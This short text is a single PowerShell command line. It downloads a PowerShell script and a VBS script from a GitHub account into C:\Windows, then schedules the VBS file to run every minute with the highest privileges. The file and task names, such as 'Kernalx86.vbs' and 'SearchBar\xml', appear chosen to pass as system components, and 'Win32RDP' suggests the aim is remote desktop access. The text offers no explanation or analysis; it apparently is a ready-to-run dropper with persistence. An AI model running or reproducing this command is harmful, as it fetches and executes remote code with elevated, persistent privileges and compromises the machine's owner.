powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Upload96/UploadDownload/main/Win32RDP.ps1','C:\Windows\Win32RDP.ps1')"; powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Upload96/UploadDownload/main/Kernalx86.vbs','C:\Windows\Kernalx86.vbs')"; powershell.exe schtasks.exe /create /SC MINUTE /TN SearchBar\xml /TR C:\Windows\Kernalx86.vbs /RL HIGHEST



